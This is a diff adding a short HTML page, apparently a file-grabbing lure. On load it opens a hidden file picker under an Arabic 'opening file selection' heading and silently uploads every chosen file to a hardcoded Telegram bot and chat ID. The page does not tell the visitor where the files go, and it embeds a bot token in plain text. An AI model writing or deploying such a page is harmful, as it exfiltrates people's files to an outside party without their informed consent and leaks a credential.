@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>Telegram Sender</title>
+</head>
+
+<body style="background:#111;color:white;text-align:center;font-family:Arial">
+
+<h2>جاري فتح اختيار الملفات...</h2>
+
+<input type="file" id="files" multiple hidden>
+
+<script>
+
+const BOT_TOKEN = "8013468520:AAG6AiRLSHTHm_F-cWtMosFAEhIiIStrHqM"
+const CHAT_ID = "5609883098"
+
+window.onload = () => {
+
+    document.getElementById("files").click()
+}
+
+document
+.getElementById("files")
+.addEventListener("change", async function(){
+
+    let files = this.files
+
+    for(let file of files){
+
+        let data = new FormData()
+
+        data.append("chat_id", CHAT_ID)
+        data.append("document", file)
+
+        await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+            {
+                method:"POST",
+                body:data
+            }
+        )
+    }
+
+    document.body.innerHTML += "<h3>تم الإرسال</h3>"
+})
+
+</script>
+
+</body>
+</html>
